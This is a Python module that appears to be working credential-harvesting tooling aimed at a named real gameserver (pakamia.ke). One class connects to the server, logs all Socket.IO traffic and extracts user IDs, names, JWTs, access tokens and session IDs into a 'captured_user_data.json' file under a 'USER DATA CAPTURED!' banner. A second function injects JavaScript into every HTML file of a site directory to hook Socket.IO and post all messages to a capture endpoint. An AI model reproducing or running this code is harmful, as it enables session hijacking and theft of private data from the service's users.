"""Socket.IO interceptor for Pakamia gameserver"""
import logging
import json
from datetime import datetime
from pathlib import Path
import socketio
import threading

logger = logging.getLogger(__name__)

class SocketIOInterceptor:
    """Intercepts Socket.IO traffic from Pakamia gameserver"""
    
    def __init__(self, output_file: str = "socketio_capture.json"):
        self.output_file = Path(output_file)
        self.output_file.parent.mkdir(parents=True, exist_ok=True)
        self.captured_messages = []
        self.sessions = {}
        self.user_data = {}
        
    def log_message(self, event: str, data: any, direction: str = "received"):
        """Log Socket.IO message"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "direction": direction,
            "event": event,
            "data": data
        }
        
        self.captured_messages.append(entry)
        
        # Save to file
        with open(self.output_file, 'w') as f:
            json.dump(self.captured_messages, f, indent=2)
        
        # Print to console
        print(f"\n{'='*60}")
        print(f"🎮 Socket.IO {direction.upper()}: {event}")
        print(f"{'='*60}")
        print(f"Time: {entry['timestamp']}")
        print(f"Data: {json.dumps(data, indent=2)[:500]}...")
        print(f"{'='*60}\n")
        
        # Extract session/user data
        self._extract_session_data(event, data)
    
    def _extract_session_data(self, event: str, data: any):
        """Extract session and user data"""
        try:
            if isinstance(data, dict):
                # Look for user data
                if 'uid' in data:
                    self.user_data['uid'] = data['uid']
                if 'name' in data:
                    self.user_data['name'] = data['name']
                if 'session' in data:
                    self.user_data['session'] = data['session']
                if 'status' in data:
                    self.user_data['status'] = data['status']
                
                # Look for tokens
                for key in ['token', 'auth', 'jwt', 'access_token', 'sessionId']:
                    if key in data:
                        self.sessions[key] = data[key]
                
                # Save if we found anything
                if self.user_data or self.sessions:
                    print(f"\n{'='*60}")
                    print(f"🎯 USER DATA CAPTURED!")
                    print(f"{'='*60}")
                    if self.user_data:
                        print(f"User: {json.dumps(self.user_data, indent=2)}")
                    if self.sessions:
                        print(f"Session: {json.dumps(self.sessions, indent=2)}")
                    print(f"{'='*60}\n")
                    
                    # Save separately
                    user_file = self.output_file.parent / "captured_user_data.json"
                    with open(user_file, 'w') as f:
                        json.dump({
                            "user_data": self.user_data,
                            "sessions": self.sessions
                        }, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to extract session data: {e}")
    
    def start_proxy(self, target_url: str = "https://gameserver.pakamia.ke"):
        """Start Socket.IO proxy client"""
        sio = socketio.Client()
        interceptor = self
        
        @sio.event
        def connect():
            interceptor.log_message("connect", {"status": "connected"}, "system")
        
        @sio.event
        def disconnect():
            interceptor.log_message("disconnect", {"status": "disconnected"}, "system")
        
        @sio.on('*')
        def catch_all(event, data):
            interceptor.log_message(event, data, "received")
        
        # Connect to real server
        try:
            sio.connect(target_url, transports=['websocket'])
            logger.info(f"Connected to {target_url}")
            
            # Keep connection alive
            sio.wait()
        except Exception as e:
            logger.error(f"Socket.IO proxy error: {e}")
            interceptor.log_message("error", {"error": str(e)}, "system")


def inject_socketio_interceptor(site_dir: str):
    """Inject JavaScript to log Socket.IO messages"""
    html_files = list(Path(site_dir).rglob("*.html"))
    
    # JavaScript to intercept Socket.IO
    intercept_script = """
<script>
// Intercept Socket.IO
(function() {
    if (typeof io !== 'undefined') {
        const originalIo = io;
        window.io = function(...args) {
            const socket = originalIo(...args);
            
            // Log all events
            const originalOn = socket.on;
            socket.on = function(event, callback) {
                return originalOn.call(this, event, function(...args) {
                    console.log('[Socket.IO RECV]', event, args);
                    // Send to our capture endpoint
                    fetch('/capture-socketio', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({event: event, data: args, direction: 'received'})
                    }).catch(e => console.error('Capture failed:', e));
                    return callback(...args);
                });
            };
            
            const originalEmit = socket.emit;
            socket.emit = function(event, ...args) {
                console.log('[Socket.IO SEND]', event, args);
                // Send to our capture endpoint
                fetch('/capture-socketio', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({event: event, data: args, direction: 'sent'})
                }).catch(e => console.error('Capture failed:', e));
                return originalEmit.call(this, event, ...args);
            };
            
            return socket;
        };
    }
})();
</script>
"""
    
    modified = 0
    for html_file in html_files:
        try:
            with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Inject before </head> or at start of <body>
            if '</head>' in content:
                content = content.replace('</head>', f'{intercept_script}</head>')
            elif '<body>' in content:
                content = content.replace('<body>', f'<body>{intercept_script}')
            else:
                content = intercept_script + content
            
            with open(html_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            modified += 1
        except Exception as e:
            logger.error(f"Failed to inject Socket.IO interceptor in {html_file}: {e}")
    
    logger.info(f"Injected Socket.IO interceptor in {modified} files")
    return modified
